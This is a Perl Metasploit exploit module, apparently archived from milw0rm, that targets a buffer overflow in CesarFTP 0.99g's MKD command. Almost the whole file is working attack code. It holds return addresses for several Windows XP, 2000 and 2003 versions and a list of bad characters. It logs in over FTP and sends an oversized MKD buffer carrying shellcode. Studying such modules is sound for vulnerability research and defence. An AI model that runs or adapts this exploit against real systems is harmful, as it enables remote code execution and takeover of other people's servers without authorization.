##
#---ORIGINAL CREDITS TO h07 FOR FINDING THIS VULN---
# Ported to metasploit by c0rrupt
# ~ f34r.us ~
##

package Msf::Exploit::cesarftp_mkd;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'CesarFTP 0.99g  Buffer Overflow',
	'Version'  => '$Revision: 1.3 $',
	'Authors'  => [ 'c0rrupt [at] f34r [dot] us', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 0,

	'AutoOpts'  => { 'EXITFUNC' => 'seh' },
	'UserOpts'  =>
	  {
		'RHOST' =>  [1, 'ADDR', 'The target address'],
		'RPORT' =>  [1, 'PORT', 'The target port', 21],
		'USER'  =>  [1, 'USER', 'Login name'],
		'PASS'  =>  [1, 'PASS', 'Password'],
	  },

	'Payload'  =>
	  {
		'Space' => 325,
		'BadChars'  => "\x00\x09\x0a\x0d\x22\x25\x26\x27\x2f\x3a\x3e\x3f\xFF\x5c",
	  },

	'Description'  =>  Pex::Text::Freeform(qq{
	This module exploits the buffer overflow found in the MKD command
	in CesarFTP 0.99g. It is required that the user be properly logged in
	before the exploit can be peformed.
}),

	'Refs'  =>
	  [
		['URL',   'http://www.milw0rm.com/exploits/1906']
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
			['Windows XP SP2 English',       0x7746F114 ],	# comctl32	
			['Windows XP SP0/SP1 English',   0x776606af ],
			['Windows 2003 server sp0/xp sp1 English',  0x77798428 ],
			['Windows 2003 server SP1 English',  0x7caa9618 ],
			['Windows 2000 SP4 English',  0x78344dd3 ],
	  ],

	'Keys'  => ['ceasarftp'],

	'DisclosureDate' => 'June 12 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];
	my $user		= $self->GetVar('USER');
	my $pass		= $self->GetVar('PASS');

	my $buf = "MKD " . "\n"x671 . "A"x3 . pack('V', $target->[1]) .  $shellcode . "\x0d\x0a";

#pack('V', $target->[1]) 

#"\x23\x79\xAB\x71"

$self->PrintLine(sprintf("[*] Trying to exploit target %s ", $target->[0], ));

	my $sock = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,

	  );

	if ($sock->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $sock->GetError);
		return;
	}
	
my $r = $sock->Recv(-1, 20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }

$self->PrintLine(sprintf("[*] Sending login credentials"));
$sock->Send("USER $user" . "\x0d\x0a"); 
sleep(1);

$sock->Send("PASS $pass" . "\x0d\x0a"); 
sleep(1);
$self->PrintLine(sprintf("[*] Sending evil request"));

$sock->Send($buf);	
$self->PrintLine(sprintf("[*] Exploit complete"));	

	
	return;
}

# milw0rm.com [2006-06-15]
